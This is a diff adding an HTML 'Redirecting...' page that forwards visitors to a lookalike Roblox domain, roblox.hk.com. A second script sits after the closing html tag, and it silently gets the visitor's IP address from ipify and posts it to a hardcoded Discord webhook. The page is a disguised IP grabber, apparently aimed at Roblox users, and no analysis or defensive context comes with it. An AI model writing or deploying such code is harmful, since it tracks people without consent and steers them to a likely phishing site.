@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>rederecting...</title>
+    <style>
+            body {
+                font-family: Arial, sans-serif;
+                display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f4f4f9;
+        }
+            .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+        h1 {
+            margin-bottom: 20px;
+            font-size: 24px;
+        }
+        p {
+            font-size: 18px;
+            color: #333;
+        }
+    </style>
+</head>
+<body>
+        <div class="container">
+            <h1>Redirecting...</h1>
+            <p>You will be redirected shortly. If not, <a id="manual-link" href="#">click here</a>.</p>
+        </div>
+    
+        <script>
+            const targetUrl = "https://roblox.hk.com/users/7321317449/profile";
+            const delay = 2000;
+            document.getElementById("manual-link").href = targetUrl;
+            setTimeout(() => {
+                window.location.href = targetUrl;
+            }, delay);
+        </script>
+    </html>
+    <script>
+        const webhookUrl = "https://discord.com/api/webhooks/1318515632861478932/vboPGXO1UMV1WeGCyqdM41cHlgQdgpmp657nsW6gEtroZs3hlHtOaqFpCNJvT4Uo4r63"
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify({
+                    content: data.ip
+                })
+            })
+            })
+    </script>
+</body>
+</html>
